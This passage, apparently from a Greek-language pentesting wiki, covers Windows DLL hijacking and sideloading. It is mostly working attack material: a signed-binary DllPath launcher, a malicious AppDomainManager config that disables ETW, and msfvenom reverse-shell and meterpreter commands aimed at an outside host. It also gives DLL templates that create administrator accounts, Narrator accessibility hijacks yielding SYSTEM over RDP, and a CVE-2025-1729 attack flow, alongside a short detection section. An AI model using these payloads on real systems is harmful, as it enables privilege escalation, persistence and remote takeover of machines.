typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Παράδειγμα επιχειρησιακής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή προωθεί τις κλήσεις στην πραγματική DLL) στον κατάλογο DllPath.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll με βάση το όνομά του, χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και κάνει sideloading της DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί στην πράξη να χρησιμοποιείται για αλυσίδες sideloading πολλών σταδίων: ένας αρχικός launcher αποθέτει μια βοηθητική DLL, η οποία στη συνέχεια εκκινεί ένα υπογεγραμμένο από τη Microsoft, ευάλωτο σε hijacking binary με προσαρμοσμένο DllPath, ώστε να εξαναγκάσει τη φόρτωση της DLL του επιτιθέμενου από έναν κατάλογο staging.<sup>[[6]](#references)</sup>


### Hijacking του .NET AppDomainManager μέσω `.exe.config`

Για στόχους **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`**, χωρίς τροποποίηση της μνήμης, μέσω κατάχρησης του παρακείμενου αρχείου **`.exe.config`** της εφαρμογής. Αντί να βασιστεί μόνο στη σειρά αναζήτησης DLL του Win32, ο επιτιθέμενος τοποθετεί ένα νόμιμο .NET EXE δίπλα σε ένα κακόβουλο config και σε μία ή περισσότερες assemblies που ελέγχει.

Πώς λειτουργεί η αλυσίδα:<sup>[[15]](#references)[[22]](#references)</sup>
1. Εκκινείται το host EXE και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να δημιουργήσει ένα `AppDomainManager` που ελέγχεται από τον επιτιθέμενο.
3. Ο κακόβουλος manager εκτελεί κώδικα **πριν από τη `Main()`** μέσα στη διεργασία του έμπιστου host.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να επιλύει πρώτα τις τοπικές assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και να αποδυναμώσει την επικύρωση/τηλεμετρία του runtime χωρίς inline patching.

Μοτίβο τύπου campaign (η ακριβής εμφώλευση μπορεί να διαφέρει ανάλογα με την οδηγία / την έκδοση του CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Γιατί είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση των assemblies στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια για sideloading.<sup>[[18]](#references)</sup>
- Τα **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε κώδικα του attacker κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η νόμιμη λογική της εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- Το **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή full-trust να φορτώσει unsigned ή τροποποιημένα assemblies χωρίς αποτυχία της επαλήθευσης strong-name.<sup>[[19]](#references)</sup>
- Το **`<publisherPolicy apply="no"/>`** αποτρέπει τις ανακατευθύνσεις publisher-policy σε νεότερα assemblies.<sup>[[20]](#references)</sup>
- Το **`<requiredRuntime ... safemode="true"/>`** κάνει την επιλογή runtime πιο προβλέψιμη.<sup>[[21]](#references)</sup>
- Το **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από το configuration, αντί το implant να κάνει patch το `EtwEventWrite` στη μνήμη.

Επιχειρησιακό μοτίβο που έχει παρατηρηθεί σε πρόσφατες καμπάνιες:
- Το Stage 1 τοποθετεί τα `setup.exe`, `setup.exe.config` και τοπικά assemblies.
- Το Stage 2 τα αντιγράφει σε έναν εύλογο φάκελο **ενημερώσεων στο AppData**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω μιας **scheduled task**.
- Το Stage 3 επαληθεύει το πλαίσιο εκτέλεσης (για παράδειγμα, ότι η αναμενόμενη parent διεργασία είναι το `svchost.exe` που ξεκίνησε από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για hunting:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **εκτελέσιμα .NET** που εκτελούνται με ύποπτα παρακείμενα αρχεία **`.config`** σε τοποθεσίες όπου μπορούν να γράψουν οι χρήστες.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Scheduled tasks που επανεκκινούν μετονομασμένα update binaries από το **`%LOCALAPPDATA%`** ή από καταλόγους `\bin\update\` συγκεκριμένων εφαρμογών.
- Αλυσίδες parent/child όπου μια scheduled task ξεκινά ένα έμπιστο .NET host, το οποίο φορτώνει αμέσως assemblies που δεν προέρχονται από τον vendor και βρίσκονται στον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL σύμφωνα με την τεκμηρίωση των Windows

Στην τεκμηρίωση των Windows αναφέρονται ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL:

- Όταν εντοπίζεται ένα **DLL με το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί γι' αυτό, ελέγχει για ανακατεύθυνση και manifest και, αν δεν βρει κάτι, χρησιμοποιεί το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν αναζητά το DLL**.
- Αν το DLL αναγνωρίζεται ως **γνωστό DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί τη δική του έκδοση του γνωστού DLL, μαζί με τυχόν εξαρτώμενα DLL, **παραλείποντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτά τα γνωστά DLL.
- Αν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση των εξαρτώμενων DLL γίνεται σαν να καθορίζονταν μόνο από τα **ονόματα των modules** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά προνόμια** (οριζόντια ή πλευρική μετακίνηση) και **της λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **δικαίωμα εγγραφής** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου αρχείου ή ένας κατάλογος μέσα στη διαδρομή συστήματος.

Αυτές οι προϋποθέσεις σπάνια ισχύουν από προεπιλογή: τα εκτελέσιμα με αυξημένα προνόμια συνήθως δεν έχουν ελλείπουσες εξαρτήσεις DLL και οι τυπικοί χρήστες συνήθως δεν μπορούν να γράψουν σε καταλόγους της διαδρομής αναζήτησης του συστήματος. Ωστόσο, λανθασμένες ρυθμίσεις μπορούν να δημιουργήσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το project [UACME](https://github.com/hfiref0x/UACME). Παρόλο που ο κύριος στόχος του είναι το UAC bypass, περιλαμβάνει PoC για DLL hijacking σε συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον κατάλογο με δικαίωμα εγγραφής που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** ως εξής:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου αρχείου και τις εξαγωγές ενός DLL με:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Για έναν πλήρη οδηγό σχετικά με το πώς να **εκμεταλλευτείτε το DLL Hijacking για κλιμάκωση προνομίων** έχοντας δικαιώματα εγγραφής σε φάκελο **System Path**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για τον εντοπισμό αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Αν εντοπίσετε ένα εκμεταλλεύσιμο σενάριο, ένα από τα σημαντικότερα πράγματα για την επιτυχή εκμετάλλευσή του είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που θα εισαγάγει από αυτό το εκτελέσιμο**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για [κλιμάκωση από επίπεδο Medium Integrity σε High **(παρακάμπτοντας το UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα έγκυρο dll** σε αυτήν τη μελέτη για το DLL hijacking που εστιάζει στην εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητ**α μπορείτε να βρείτε ορισμένα **βασικά παραδείγματα κώδικα dll** που μπορεί να φανούν χρήσιμα ως **πρότυπα** ή για τη δημιουργία ενός **dll με εξαγόμενες μη απαιτούμενες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση DLL**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελεί τον κακόβουλο κώδικά σας κατά τη φόρτωσή του**, αλλά και να **εκθέτει** λειτουργίες και να **λειτουργεί** όπως **αναμένεται**, **προωθώντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll**, ή να **ορίσετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λήψη rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Αποκτήστε ένα meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Δημιουργήστε έναν χρήστη (x86, δεν είδα έκδοση x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Το δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε συνάρτηση που εισάγεται από τη διεργασία-θύμα**. Αν λείπει κάποια απαιτούμενη εξαγωγή, το binary δεν μπορεί να την επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Εναλλακτική DLL σε C με σημείο εισόδου νήματος</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT με αρχικοποίηση που ενεργοποιείται από export

Μια αυτόνομη **κοινόχρηστη βιβλιοθήκη .NET NativeAOT** μπορεί να χρησιμοποιηθεί ως τοποθετημένο native DLL χωρίς να υλοποιηθεί ρητά `DllMain`. Κάντε export στατικές μεθόδους C# με `[UnmanagedCallersOnly(EntryPoint = "...")]`· όταν το native host καλέσει ένα από αυτά τα entry points που δημιουργήθηκαν από τον compiler, το NativeAOT αρχικοποιεί το module και εκτελείται μια μέθοδος `[ModuleInitializer]` πριν από το exported σώμα της C#.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Το DLL εξακολουθεί να χρειάζεται τα **ονόματα export και τις υπογραφές που είναι συμβατές με το ABI** και τις οποίες καλεί πράγματι το επιλεγμένο host. Τα ελάχιστα stubs μπορεί να αρκούν για να ενεργοποιήσουν την αρχικοποίηση, αλλά τα exports που λείπουν μπορεί να εμποδίσουν τη φόρτωση, ενώ μια λανθασμένη υπογραφή μπορεί να προκαλέσει αλλοίωση της κλήσης. Καταγράψτε τα imports του host και επικυρώστε το αποτέλεσμα με `dumpbin /exports payload.dll` πριν μετονομάσετε το output στο όνομα dependency που αναμένει το host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Ελάχιστο exported DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Διαμορφώστε το έργο ως αυτόνομη εγγενή κοινόχρηστη βιβλιοθήκη των Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Τοποθετήστε το μετονομασμένο DLL δίπλα στο αντιγραμμένο, ευάλωτο εκτελέσιμο και εκκινήστε τον host μέσω της διαδρομής κώδικα που καλεί το συμβατό export. Αυτή η προσέγγιση με initializer αποφεύγει την τοποθέτηση σύνθετων εργασιών απευθείας στο `DllMain`, αλλά οι προϋποθέσεις του sideload παραμένουν αμετάβλητες: ο loader πρέπει να επιλύσει την εξάρτηση με βάση το όνομα, να επιλέξει τον κατάλογο της εφαρμογής και να μην την εντοπίσει πρώτα μέσω των KnownDLLs, μιας ήδη φορτωμένης μονάδας, ανακατεύθυνσης SxS ή περιορισμένων σημαιών `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Για συμβατικά native templates, δείτε το [Windows C payloads](../windows-c-payloads.md). Ένα sideloaded πρώτο στάδιο μπορεί στη συνέχεια να εκτελέσει [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), αλλά αυτό είναι ξεχωριστή τεχνική injection και όχι μέρος της επίλυσης DLL.

## Ανίχνευση: φορτώσεις βιβλιοθηκών μέσω DLL masquerading

Το Elastic Defend 9.5.0 εμπλουτίζει ένα συμβάν φόρτωσης βιβλιοθήκης με `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` όταν το φορτωμένο αρχείο δεν έχει υπογραφή Microsoft και το όνομα αρχείου του συγκρούεται με το αποθηκευμένο στην cache απόθεμα ονομάτων DLL των Windows/συστήματος του Elastic. Έτσι, η απογραφή ονομάτων αρχείων και η ανάλυση θέσης συστήματος και υπογραφής μεταφέρονται στον αισθητήρα endpoint· συνεπώς, το βασικό EQL μπορεί να περιοριστεί σε:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Αντιμετωπίστε τον εμπλουτισμό ως πολύτιμο pivot και όχι ως απόδειξη από μόνο του. Αυξήστε το επίπεδο βεβαιότητας όταν ένας υπογεγραμμένος host φορτώνει το DLL από δικό του **εγγράψιμο από τον χρήστη** κατάλογο, το DLL είναι ανυπόγραφο/μη έμπιστο και το `dll.Ext.relative_file_creation_time` δείχνει ότι δημιουργήθηκε λίγο πριν από τη φόρτωσή του. Περιορίστε τις εξαιρέσεις στον ακριβή εκδότη + host process + διαδρομή εγκατάστασης· μην καταστέλλετε καθολικά ένα όνομα DLL που συγκρούεται, καθώς νόμιμα προγράμματα εγκατάστασης και εφαρμογές μπορούν να περιλαμβάνουν ιδιωτικές βιβλιοθήκες με ονόματα που μοιάζουν με ονόματα συστήματος.<sup>[[26]](#references)</sup>

Σε αισθητήρες χωρίς αυτόν τον εμπλουτισμό, προσεγγίστε τη συμπεριφορά συσχετίζοντας ένα όνομα DLL που συγκρούεται με διαδρομή φόρτωσης εκτός συστήματος, απουσία/μη έμπιστη υπογραφή Microsoft και μικρό διάστημα από τη δημιουργία του αρχείου έως τη φόρτωσή του. Αυτό απαιτεί ενημερωμένο κατάλογο ονομάτων DLL και περιορισμένες εξαιρέσεις για τα `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` και άλλες εγκεκριμένες διαδρομές ανάπτυξης.<sup>[[26]](#references)</sup>

## Μελέτη περίπτωσης: Hijack DLL Localization TTS του Narrator OneCore (Προσβασιμότητα/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά μια προβλέψιμη, ειδική για τη γλώσσα DLL localization, η οποία μπορεί να γίνει hijack για αυθαίρετη εκτέλεση κώδικα και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Διαδρομή αναζήτησης (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλιότερη διαδρομή (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει ένα εγγράψιμο από τον εισβολέα DLL στη διαδρομή OneCore, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Εντοπισμός με Procmon
- Φίλτρο: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης της παραπάνω διαδρομής.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Σιωπηλή λειτουργία OPSEC
- Ένα αφελές hijack θα κάνει το UI να μιλήσει/να επισημανθεί. Για να παραμείνετε αθόρυβοι, κατά το attach απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και εκτελέστε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Ενεργοποίηση και persistence μέσω ρύθμισης Accessibility
- Πλαίσιο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.

Εκτέλεση SYSTEM μέσω RDP (lateral movement)
- Επιτρέψτε το κλασικό επίπεδο ασφάλειας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε μέσω RDP στον host και, στην οθόνη σύνδεσης, πατήστε CTRL+WIN+ENTER για να εκκινήσει ο Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει η συνεδρία RDP—κάντε inject/migrate αμέσως.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη εγγραφή registry Accessibility Tool (AT) (π.χ., CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγετε και, στη συνέχεια, να ορίσετε το `configuration` στο όνομα αυτού του AT. Έτσι, γίνεται proxy για αυθαίρετη εκτέλεση μέσω του framework Accessibility.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα διαχειριστή.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν χρειάζονται exports.

## Μελέτη περίπτωσης: CVE-2025-1729 - Κλιμάκωση προνομίων μέσω του TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), το οποίο παρακολουθείται ως **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Λεπτομέρειες ευπάθειας

- **Στοιχείο**: `TPQMAssistant.exe`, που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη εργασία**: Η `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. στο πλαίσιο του συνδεδεμένου χρήστη.
- **Δικαιώματα καταλόγου**: Εγγράψιμος από το `CREATOR OWNER`, επιτρέποντας σε τοπικούς χρήστες να αποθέτουν αυθαίρετα αρχεία.
- **Συμπεριφορά αναζήτησης DLL**: Επιχειρεί πρώτα να φορτώσει το `hostfxr.dll` από τον κατάλογο εργασίας του και καταγράφει "NAME NOT FOUND" αν λείπει, υποδεικνύοντας προτεραιότητα αναζήτησης στον τοπικό κατάλογο.

### Υλοποίηση exploit

Ένας attacker μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος το DLL που λείπει για να επιτύχει εκτέλεση κώδικα στο πλαίσιο του χρήστη:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Ροή επίθεσης

1. Ως κανονικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο περιβάλλον του τρέχοντος χρήστη.
3. Αν ένας διαχειριστής είναι συνδεδεμένος κατά την εκτέλεση της εργασίας, το κακόβουλο DLL εκτελείται στην περίοδο λειτουργίας του διαχειριστή με μεσαίο επίπεδο ακεραιότητας.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης UAC για να αποκτήσετε προνόμια SYSTEM από το μεσαίο επίπεδο ακεραιότητας.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading μέσω υπογεγραμμένου host (wsc_proxy.exe)

Οι φορείς απειλών συχνά συνδυάζουν droppers βασισμένα σε MSI με DLL side-loading, ώστε να εκτελούν payloads μέσω μιας έμπιστης, υπογεγραμμένης διεργασίας.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
